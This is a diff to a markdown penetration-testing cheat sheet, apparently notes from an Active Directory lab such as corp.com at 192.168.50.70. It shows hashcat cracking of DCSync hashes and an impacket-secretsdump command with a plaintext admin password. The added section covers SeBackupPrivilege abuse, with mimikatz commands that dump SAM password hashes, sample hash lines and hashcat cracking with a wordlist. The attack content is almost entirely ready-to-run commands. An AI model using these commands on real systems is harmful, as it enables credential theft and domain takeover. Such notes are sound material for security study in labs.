@@ -1246,7 +1246,23 @@ Login to DC
   - crack the hash **1000 hash.dcsync**  
     `hashcat -m 1000 hash.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` #Flowers1
   - Alternate tool - secretsdump  
-    `kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`  
+    `kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`
+- lower priviledge user has "sebackupprivilage abuse"  
+  - check priviledge  
+    `whoami /priv`  
+  - Dump SAM hashes  
+    ```
+    mimikatz # privilege::debug
+    mimikatz # token::elevate /user:BackupOperator
+    mimikatz # lsadump::sam
+    ```
+  - Save hashes to file (1st and 3rd field NThash)  
+    ```
+    Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
+    Guest:31d6cfe0d16ae931b73c59d7e0c089c0
+    ```
+  - Crack the hash **1000 hash.NThash**
+    `hashcat -m 1000 hash.NThash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
 
 # Lateral movement  
 1. DC1 --> MS02
